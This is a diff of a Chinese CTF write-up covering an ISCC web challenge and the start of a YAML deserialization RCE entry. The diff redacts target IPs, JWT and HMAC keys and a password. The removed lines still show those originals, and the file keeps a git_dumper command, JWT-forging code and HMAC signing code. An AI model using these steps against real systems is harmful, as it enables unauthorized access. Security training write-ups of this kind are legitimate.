@@ -923,7 +923,7 @@ if ($key === "secret_value") { ... }
 
 ## 一、ISCC CTF Web (解出 \ud83d\udd25)
 
-**题目**: \`http://39.105.213.28:49106\`
+**题目**: \`http://<靶机地址>:49106\`
 **FLAG**: \`ISCC{K6FRFyHAMaMmPZNmXXpA}\`
 
 ### 攻击链
@@ -931,7 +931,7 @@ if ($key === "secret_value") { ... }
 #### 1. \`.git\` 源码泄露
 \`\`\`bash
 # 用 git_dumper 克隆仓库
-python git_dumper.py http://39.105.213.28:49106/.git/ ./iscc_git/
+python git_dumper.py http://<靶机地址>:49106/.git/ ./iscc_git/
 
 # 查看 git 历史，找到旧版本
 git log --all --oneline
@@ -939,13 +939,13 @@ git show <commit_id>:legacy_probe_stub.py
 \`\`\`
 
 从 \`.git/objects\` 中还原了旧版 \`legacy_probe_stub.py\`，获取两个关键密钥：
-- **JWT 密钥**: \`ISCC_2026_JWT_DEBUG_KEY_#9527\`
-- **旧版 HMAC 密钥**: \`ISCC_SERVER_SECRET_REAL\`
+- **JWT 密钥**: \`ISCC_2026_JWT_DEBUG_KEY_[REDACTED]\`
+- **旧版 HMAC 密钥**: \`ISCC_SERVER_SECRET_[REDACTED]\`
 
 #### 2. 登录
 \`\`\`
 用户名: auditor
-密码: audit2025
+密码: [REDACTED]
 \`\`\`
 （从 git 历史或源码中找到的凭据）
 
@@ -953,7 +953,7 @@ git show <commit_id>:legacy_probe_stub.py
 \`\`\`python
 import jwt
 payload = {"sub": "auditor_id", "role": "auditor", "exp": 9999999999}
-token = jwt.encode(payload, "ISCC_2026_JWT_DEBUG_KEY_#9527", algorithm="HS256")
+token = jwt.encode(payload, "ISCC_2026_JWT_DEBUG_KEY_[REDACTED]", algorithm="HS256")
 # 将 token 填入 Cookie: jwt_token=xxx
 \`\`\`
 
@@ -973,7 +973,7 @@ node_id = "core-storage-01"
 timestamp = str(int(time.time()))
 msg = f"{node_id}:{timestamp}"
 sig = hmac.new(
-    "ISCC_SERVER_SECRET_REAL".encode(),
+    "ISCC_SERVER_SECRET_[REDACTED]".encode(),
     msg.encode(),
     hashlib.sha256
 ).hexdigest()
@@ -1285,7 +1285,7 @@ flag{It3_D3bugG_T11me!_le3_play}
     content: `
 # 喵喵宠物医院 -- YAML 反序列化 RCE
 
-**靶场**: 175.27.251.122:10001
+**靶场**: <靶机地址>:10001
 **类型**: Misc / Insecure Deserialization
 **难度**: Medium
 
